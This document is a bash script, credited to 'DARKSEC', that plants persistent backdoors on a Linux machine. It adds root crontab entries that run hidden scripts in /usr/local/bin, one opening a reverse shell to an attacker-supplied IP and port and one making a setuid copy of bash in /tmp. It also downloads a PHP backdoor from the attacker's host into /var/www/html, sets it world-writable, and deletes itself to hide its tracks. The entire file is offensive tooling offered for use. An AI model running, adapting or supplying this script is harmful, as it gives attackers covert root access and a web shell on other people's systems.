#!/bin/bash
# DEVELOPER DARKSEC
# on the ip and port, choice the type from payload or connection reverse.
# CREATE IN 2023 BY DARKSEC

darksec="$PWD"

if [ -z $2 ];
then
          echo  'PUT YOUR IP LOCAL AND YOUR PORT FOR REVERSE SHELL'
else

echo '[+] RUNNING BACKDOOR'
sleep 1

# REVERSE SHELL WITH CRONTAB
sed -i -e '$i\* * * * * root .system.sh' /etc/crontab
sed -i -e '$i\* * * * * root .root.sh' /etc/crontab
sleep 5

# ENTER IN DIRETORY
cd /usr/local/bin
sleep 1

# CREATE FILES FOR SHELL REVERSE
touch .system.sh
echo "#\!/bin/bash" > /usr/local/bin/.system.sh
echo "sh -i >& /dev/udp/$1/$2 0>&1" >> /usr/local/bin/.system.sh
sleep 1
chmod +x /usr/local/bin/.system.sh
touch .root.sh
chmod +x /usr/local/bin/.root.sh
echo "#\!/bin/bash" > /usr/local/bin/.root.sh
echo "cp /bin/bash /tmp/.root && chmod +xs /tmp/.root" >> /usr/local/bin/.root.sh
sleep 1

# CHANGE DIRETORY WEB INSTALL BACKDOOR.PHP

cd /var/www/html/ && wget -q http://$1//darksec.php &&  curl -s http://$1//darksec.php -o darksec.php && chmod 777 /var/www/html/darksec.php

#BACK DIretory
cd $darksec

# DELETE BACKDOOR
rm -rf darksec.sh

# SUCCESS, BACKDOOR RUNNING
echo  '[+] SUCCESS BACKDOOR RUNNING!'

fi
